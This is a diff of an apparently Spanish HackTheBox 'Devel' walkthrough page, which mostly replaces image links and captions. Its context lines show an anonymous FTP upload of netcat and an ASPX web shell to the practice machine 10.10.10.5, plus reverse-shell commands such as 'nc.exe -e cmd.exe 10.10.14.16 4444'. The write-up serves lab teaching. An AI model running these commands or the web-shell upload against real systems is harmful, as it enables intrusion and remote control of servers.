@@ -14,6 +14,7 @@
     
     <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="../assets/css/image-fix.css">
     
     <!-- Responsive Images Fix -->
     <link rel="stylesheet" href="../assets/css/responsive-images.css">
@@ -698,6 +699,15 @@ passive           # Modo pasivo (atravesar firewalls)</code>
                         <p><strong>Resultado:</strong> El escaneo revela que el puerto <span class="port-status port-open">21 (FTP)</span> está abierto y accesible.</p>
                     </div>
 
+                    <div class="image-showcase">
+                        <div class="image-container">
+                            <img src="./images/nmap-scan-devel.png" alt="Escaneo Nmap de HTB Devel mostrando puertos FTP y HTTP">
+                            <div class="image-caption">
+                                <strong>Reconocimiento:</strong> Escaneo Nmap de HTB Devel (10.10.10.5) revelando puertos críticos: 21 (FTP) y 80 (HTTP) abiertos para la explotación.
+                            </div>
+                        </div>
+                    </div>
+
                     <h4>Enumeración Detallada del Servicio FTP:</h4>
                     <div class="code-block">
                         <div class="code-label">Escaneo de Versión y Scripts</div>
@@ -708,14 +718,6 @@ passive           # Modo pasivo (atravesar firewalls)</code>
                         <p><strong>Descubrimiento Crítico:</strong> El scan revela "Anonymous FTP login allowed" - confirmando que el servidor permite acceso sin autenticación.</p>
                     </div>
 
-                    <div class="image-showcase">
-                        <div class="image-container">
-                            <img src="https://usefdoybenz.github.io/ethicalhacking/wp-content/uploads/2024/01/image-7.png" alt="Nmap FTP scan results HTB Devel">
-                            <div class="image-caption">
-                                🔍 <strong>Escaneo Nmap FTP:</strong> Resultado del escaneo detallado del puerto 21 en HTB Devel (10.10.10.5). Se observa que el servicio FTP Microsoft ftpd permite acceso anónimo, lo que constituye un vector de ataque crítico para el servidor Windows.
-                            </div>
-                        </div>
-                    </div>
 
                     <h4>Fase 2: Acceso FTP Anónimo</h4>
                     <p>Procedemos a conectarnos al servidor FTP utilizando credenciales anónimas:</p>
@@ -736,12 +738,13 @@ ftp> pwd</code>
 
                     <div class="image-showcase">
                         <div class="image-container">
-                            <img src="https://usefdoybenz.github.io/ethicalhacking/wp-content/uploads/2024/01/image-8.png" alt="FTP Anonymous login HTB Devel">
+                            <img src="./images/ftp-connection-success.png" alt="Conexión FTP anónima exitosa en HTB Devel">
                             <div class="image-caption">
-                                🚪 <strong>Acceso FTP Anónimo:</strong> Conexión exitosa al servidor FTP usando credenciales anónimas. La sesión muestra acceso completo al directorio raíz del servidor IIS, confirmando permisos tanto de lectura como de escritura.
+                                <strong>Acceso FTP Anónimo:</strong> Conexión exitosa al servidor FTP usando credenciales anónimas, confirmando "Anonymous access allowed".
                             </div>
                         </div>
                     </div>
+
 
                     <div class="alert alert-info">
                         <p><strong>Descubrimiento de Permisos:</strong> El servidor no solo permite acceso de lectura, sino también permisos de escritura, lo que nos permite subir archivos maliciosos.</p>
@@ -770,12 +773,13 @@ ftp> put aspx_cmd.aspx</code>
 
                     <div class="image-showcase">
                         <div class="image-container">
-                            <img src="https://usefdoybenz.github.io/ethicalhacking/wp-content/uploads/2024/01/image-9.png" alt="FTP upload netcat and web shell">
+                            <img src="./images/ftp-anonymous-access.png" alt="Subida de archivos maliciosos via FTP">
                             <div class="image-caption">
-                                🚀 <strong>Subida de Herramientas:</strong> Proceso de upload exitoso de nc.exe y aspx_cmd.aspx al servidor FTP. Los archivos se sincronizan automáticamente con el directorio web de IIS (/inetpub/wwwroot/), permitiendo la ejecución remota.
+                                <strong>Subida de Payload:</strong> Transferencia exitosa de herramientas (netcat y web shell ASPX) al servidor FTP con permisos de escritura.
                             </div>
                         </div>
                     </div>
+
 
                     <h4>Fase 4: Activación de Web Shell</h4>
                     <p>Los archivos subidos se sincronizan automáticamente con el directorio web de IIS:</p>
@@ -789,14 +793,6 @@ http://10.10.10.5/aspx_cmd.aspx
 C:\\inetpub\\wwwroot\\</code>
                     </div>
 
-                    <div class="image-showcase">
-                        <div class="image-container">
-                            <img src="https://usefdoybenz.github.io/ethicalhacking/wp-content/uploads/2024/01/image-10.png" alt="ASPX Web Shell interface">
-                            <div class="image-caption">
-                                🌐 <strong>Web Shell ASPX Activa:</strong> Interfaz de la web shell ejecutándose en el navegador vía IIS. La shell permite ejecución de comandos remotos en el servidor Windows, incluyendo la activación de netcat para establecer una reverse shell.
-                            </div>
-                        </div>
-                    </div>
 
                     <h4>Fase 5: Establecimiento de Reverse Shell</h4>
                     <p>Configuramos un listener en nuestra máquina atacante y ejecutamos Netcat desde la Web Shell:</p>
@@ -811,6 +807,15 @@ nc -nlvp 4444
 nc -nlvp 1234</code>
                     </div>
 
+                    <div class="image-showcase">
+                        <div class="image-container">
+                            <img src="./images/netcat-listener.png" alt="Listener Netcat para reverse shell">
+                            <div class="image-caption">
+                                <strong>Preparación Listener:</strong> Configuración de listener netcat en puerto 443 esperando la conexión de reverse shell desde el objetivo.
+                            </div>
+                        </div>
+                    </div>
+
                     <div class="code-block">
                         <div class="code-label">Comando de Reverse Shell</div>
                         <code># Comando ejecutado desde Web Shell
@@ -821,14 +826,6 @@ nc.exe -e cmd.exe 10.10.14.16 4444
 nc.exe -e powershell.exe 10.10.14.16 1234</code>
                     </div>
 
-                    <div class="image-showcase">
-                        <div class="image-container">
-                            <img src="https://usefdoybenz.github.io/ethicalhacking/wp-content/uploads/2024/01/image-11.png" alt="Netcat reverse shell established">
-                            <div class="image-caption">
-                                ⚡ <strong>Reverse Shell Establecida:</strong> Conexión exitosa de netcat mostrando shell completa del sistema Windows. Se observa acceso directo al cmd.exe con permisos del usuario IIS, lo que permite navegación del sistema y ejecución de comandos remotos.
-                            </div>
-                        </div>
-                    </div>
 
                     <div class="alert alert-info">
                         <p><strong>Resultado Exitoso:</strong> Una vez ejecutado el comando, obtenemos una reverse shell completa con acceso al sistema Windows, permitiendo ejecución de comandos, navegación del sistema de archivos y potencial escalación de privilegios.</p>
